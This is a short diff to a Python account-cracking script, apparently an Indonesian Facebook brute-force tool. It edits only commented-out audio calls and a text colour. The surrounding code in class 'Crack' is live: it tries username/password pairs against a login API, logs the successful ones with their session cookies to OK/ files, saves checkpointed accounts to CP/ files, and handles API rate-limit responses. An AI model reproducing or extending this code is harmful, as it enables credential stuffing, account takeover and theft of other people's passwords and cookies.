@@ -519,7 +519,7 @@ class Crack:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 							prints(tree)
-							#os.popen('play-audio o.mp3')
+							#.popen('play-audio o.mp3')
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
 						break
 				elif "User must verify their account" in post.text:
@@ -531,7 +531,7 @@ class Crack:
 						tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
 						tree.add(Panel(f"{M2}{ua}{K2}",style=f"{color_panel}"))
 						prints(tree)
-						#os.popen('play-audio c.mp3')
+						#.popen('play-audio c.mp3')
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
@@ -726,7 +726,7 @@ class Lain:
 		if now.month+1 > 12:tahun = now.year+1
 		data = date(year=tahun,month=bulan,day=hari)
 		aktif = data.strftime("%d %B %Y")
-		console.print(f" {M2}• {K2}aktif sampai : {aktif}")
+		console.print(f" {H2}• {K2}aktif sampai : {aktif}")
 		prints(Panel(f"""{M2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
 		sys.exit()
 		
